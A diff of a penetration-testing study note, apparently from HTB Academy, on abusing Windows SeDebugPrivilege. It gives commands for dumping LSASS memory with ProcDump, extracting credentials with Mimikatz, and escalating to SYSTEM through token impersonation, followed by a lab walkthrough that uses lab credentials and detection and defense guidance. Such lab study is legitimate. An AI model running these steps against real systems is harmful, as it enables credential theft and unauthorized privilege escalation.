@@ -1,4 +1,4 @@
-# SeDebugPrivilege Exploitation
+# 🔍 SeDebugPrivilege
 
 ## 🎯 Overview
 
@@ -7,12 +7,14 @@
 ## 🔑 Privilege Fundamentals
 
 ### SeDebugPrivilege Capabilities
-- **Memory access** to critical OS components
-- **Process debugging** including system processes  
-- **LSASS dumping** for credential extraction
-- **Token manipulation** for privilege escalation
+
+* **Memory access** to critical OS components
+* **Process debugging** including system processes
+* **LSASS dumping** for credential extraction
+* **Token manipulation** for privilege escalation
 
 ### Common Assignment Contexts
+
 ```cmd
 # Local/Domain Group Policy assignment:
 Computer Settings > Windows Settings > Security Settings > Local Policies > User Rights Assignment
@@ -20,13 +22,15 @@ Computer Settings > Windows Settings > Security Settings > Local Policies > User
 ```
 
 **Target Users:**
-- **Developers** - for system component debugging
-- **System admins** - for troubleshooting purposes
-- **Service accounts** - for application debugging
+
+* **Developers** - for system component debugging
+* **System admins** - for troubleshooting purposes
+* **Service accounts** - for application debugging
 
 ## 📊 Privilege Detection
 
 ### Enumeration
+
 ```cmd
 # Check current privileges
 whoami /priv
@@ -36,21 +40,24 @@ SeDebugPrivilege                          Debug programs                     Dis
 ```
 
 **Important Notes:**
-- Privilege shows as **Disabled** by default
-- **Elevated shell** required to utilize
-- Automatically enabled when running privileged operations
+
+* Privilege shows as **Disabled** by default
+* **Elevated shell** required to utilize
+* Automatically enabled when running privileged operations
 
 ## 💾 LSASS Memory Dumping
 
 ### Method 1: ProcDump (SysInternals)
 
 #### Prerequisites
+
 ```cmd
 # Elevated PowerShell/Command Prompt required
 # ProcDump from SysInternals suite
 ```
 
 #### LSASS Process Dump
+
 ```cmd
 # Dump LSASS process memory
 procdump.exe -accepteula -ma lsass.exe lsass.dmp
@@ -63,6 +70,7 @@ ProcDump v10.0 - Sysinternals process dump utility
 ```
 
 #### Credential Extraction with Mimikatz
+
 ```cmd
 mimikatz.exe
 
@@ -95,6 +103,7 @@ SID               : S-1-5-21-3769161915-3336846931-3985975925-1000
 ### Method 2: Task Manager (GUI)
 
 #### Manual LSASS Dump
+
 1. **Open Task Manager** (Ctrl+Shift+Esc)
 2. **Navigate** to Details tab
 3. **Find lsass.exe** process
@@ -107,13 +116,15 @@ SID               : S-1-5-21-3769161915-3336846931-3985975925-1000
 ### Token Impersonation Technique
 
 #### Concept
-- **Parent process targeting** - identify SYSTEM processes
-- **Token inheritance** - child process inherits parent token
-- **Process creation** - spawn elevated child process
+
+* **Parent process targeting** - identify SYSTEM processes
+* **Token inheritance** - child process inherits parent token
+* **Process creation** - spawn elevated child process
 
 ### PowerShell PoC Script
 
 #### Process ID Enumeration
+
 ```powershell
 # List running processes with PIDs
 tasklist
@@ -125,6 +136,7 @@ lsass.exe                      680 Services                   0     15,332 K
 ```
 
 #### Process Impersonation
+
 ```powershell
 # Load PoC script (psgetsystem)
 # GitHub: https://github.com/decoder-it/psgetsystem
@@ -140,6 +152,7 @@ $lsass = Get-Process lsass
 ```
 
 #### Verification
+
 ```cmd
 # New command prompt opens as SYSTEM
 C:\Windows\system32>whoami
@@ -152,20 +165,23 @@ C:\Windows\system32>whoami /priv
 ## 🎯 HTB Academy Lab Solution
 
 ### Lab Environment
-- **Target**: `10.129.43.43` (ACADEMY-WINLPE-SRV01)
-- **Credentials**: `jordan:HTB_@cademy_j0rdan!`
-- **Access Method**: RDP
-- **Objective**: Obtain NTLM hash for `sccm_svc` account
+
+* **Target**: `10.129.43.43` (ACADEMY-WINLPE-SRV01)
+* **Credentials**: `jordan:HTB_@cademy_j0rdan!`
+* **Access Method**: RDP
+* **Objective**: Obtain NTLM hash for `sccm_svc` account
 
 ### Step-by-Step Solution
 
 #### 1. RDP Connection
+
 ```bash
 # Connect via RDP
 xfreerdp /v:10.129.43.43 /u:jordan /p:'HTB_@cademy_j0rdan!'
 ```
 
 #### 2. Verify SeDebugPrivilege
+
 ```cmd
 # Open elevated Command Prompt (Run as Administrator)
 # Enter jordan's credentials when prompted
@@ -175,6 +191,7 @@ C:\>whoami /priv
 ```
 
 #### 3. LSASS Memory Dump
+
 ```cmd
 # Navigate to tools directory
 cd C:\Tools
@@ -187,6 +204,7 @@ dir lsass.dmp
 ```
 
 #### 4. Credential Extraction
+
 ```cmd
 # Launch Mimikatz
 mimikatz.exe
@@ -201,7 +219,8 @@ mimikatz # sekurlsa::minidump lsass.dmp
 mimikatz # sekurlsa::logonpasswords
 ```
 
-#### 5. Locate sccm_svc Hash
+#### 5. Locate sccm\_svc Hash
+
 ```cmd
 # Search for sccm_svc account in output
 # Look for NTLM hash in msv section:
@@ -217,6 +236,7 @@ Domain            : WINLPE-SRV01
 ```
 
 #### 6. Submit Hash
+
 ```cmd
 # Submit the NTLM hash found for sccm_svc account
 # Format: 32-character hexadecimal string
@@ -225,12 +245,14 @@ Domain            : WINLPE-SRV01
 ### Alternative Approaches
 
 #### PowerShell-Based Extraction
+
 ```powershell
 # If ProcDump unavailable, use PowerShell memory access
 # Requires custom scripts for memory manipulation
 ```
 
 #### Task Manager Method
+
 ```cmd
 # GUI approach:
 1. Task Manager → Details tab
@@ -242,6 +264,7 @@ Domain            : WINLPE-SRV01
 ## 🔍 Detection Indicators
 
 ### Process Activity
+
 ```cmd
 # Suspicious activities to monitor:
 - procdump.exe execution with lsass.exe target
@@ -251,13 +274,15 @@ Domain            : WINLPE-SRV01
 ```
 
 ### Event Logs
-- **Event ID 4656** - Handle to object requested (LSASS access)
-- **Event ID 4663** - Attempt to access object (memory dump)  
-- **Event ID 4688** - New process creation (debugging tools)
+
+* **Event ID 4656** - Handle to object requested (LSASS access)
+* **Event ID 4663** - Attempt to access object (memory dump)
+* **Event ID 4688** - New process creation (debugging tools)
 
 ## 🛡️ Defense Strategies
 
 ### Privilege Hardening
+
 ```cmd
 # Remove SeDebugPrivilege from non-essential accounts
 # Implement least-privilege principles
@@ -265,6 +290,7 @@ Domain            : WINLPE-SRV01
 ```
 
 ### Monitoring and Detection
+
 ```cmd
 # Monitor for:
 - LSASS process access attempts
@@ -274,6 +300,7 @@ Domain            : WINLPE-SRV01
 ```
 
 ### LSASS Protection
+
 ```cmd
 # Enable LSASS protection (Windows 8.1+)
 # Configure Windows Defender Credential Guard
@@ -283,23 +310,26 @@ Domain            : WINLPE-SRV01
 ## 📋 SeDebugPrivilege Exploitation Checklist
 
 ### Prerequisites
-- [ ] **User account** with SeDebugPrivilege assigned
-- [ ] **Elevated shell** (Run as Administrator)
-- [ ] **ProcDump/Mimikatz** tools available
-- [ ] **Target identification** (LSASS or SYSTEM processes)
+
+* [ ] **User account** with SeDebugPrivilege assigned
+* [ ] **Elevated shell** (Run as Administrator)
+* [ ] **ProcDump/Mimikatz** tools available
+* [ ] **Target identification** (LSASS or SYSTEM processes)
 
 ### LSASS Dumping Steps
-- [ ] **Verify privilege** (`whoami /priv`)
-- [ ] **Execute procdump** on lsass.exe
-- [ ] **Launch Mimikatz** with logging enabled
-- [ ] **Load dump file** (`sekurlsa::minidump`)
-- [ ] **Extract credentials** (`sekurlsa::logonpasswords`)
 
-### SYSTEM Escalation Steps  
-- [ ] **Identify SYSTEM process** PID (`tasklist`)
-- [ ] **Load PoC script** (psgetsystem)
-- [ ] **Execute impersonation** command
-- [ ] **Verify SYSTEM access** (`whoami`)
+* [ ] **Verify privilege** (`whoami /priv`)
+* [ ] **Execute procdump** on lsass.exe
+* [ ] **Launch Mimikatz** with logging enabled
+* [ ] **Load dump file** (`sekurlsa::minidump`)
+* [ ] **Extract credentials** (`sekurlsa::logonpasswords`)
+
+### SYSTEM Escalation Steps
+
+* [ ] **Identify SYSTEM process** PID (`tasklist`)
+* [ ] **Load PoC script** (psgetsystem)
+* [ ] **Execute impersonation** command
+* [ ] **Verify SYSTEM access** (`whoami`)
 
 ## 💡 Key Takeaways
 
@@ -310,6 +340,6 @@ Domain            : WINLPE-SRV01
 5. **Developer accounts** commonly have this privilege assigned
 6. **Detection** possible through process monitoring and event logs
 
----
+***
 
-*SeDebugPrivilege exploitation provides reliable access to system credentials and SYSTEM-level privileges when properly leveraged.* 
+_SeDebugPrivilege exploitation provides reliable access to system credentials and SYSTEM-level privileges when properly leveraged._
